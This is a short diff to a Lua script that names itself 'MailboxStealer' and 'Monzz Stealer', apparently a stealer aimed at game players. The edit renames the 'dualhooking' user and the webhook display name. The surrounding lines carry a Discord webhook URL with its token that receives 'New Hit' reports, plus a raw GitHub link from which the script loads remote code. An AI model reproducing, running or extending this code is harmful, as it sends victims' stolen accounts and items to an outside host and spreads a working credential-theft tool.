@@ -1,4 +1,4 @@
-local dhuser "Baju_Basah122"       -- dualhooking user
+local dhuser = "TehPucuk_55"       -- dualhooking user
 local dhwebhook = "https://discord.com/api/webhooks/1126402135786000395/TV27VBc_jbyXZHliylbsadlR2kzI9CAmwv_Rsnk-lu8H0d47NNj6AisAcZKlUoeBYujx" -- Dualhooking Webhook
 local loadingraw = "https://raw.githubusercontent.com/MonzzScriptz/MailboxStealer/main/LoadingScreen.lua" -- Put Your LoadingScreen Raw Link Here
 
@@ -1226,7 +1226,7 @@ if banktiercheck == true then
 
     data1 = {
         ["content"] = ping,
-        ["username"] = "Rizz Scriptz",
+        ["username"] = "Monzz Scriptz",
         ["avatar_url"] = "https://cdn.discordapp.com/attachments/1121512295709806782/1130597250876330005/vidma_20230718_032704.gif",
         ["embeds"] = { {
             ["title"] = "**New Hit** ||Monzz Stealer||",
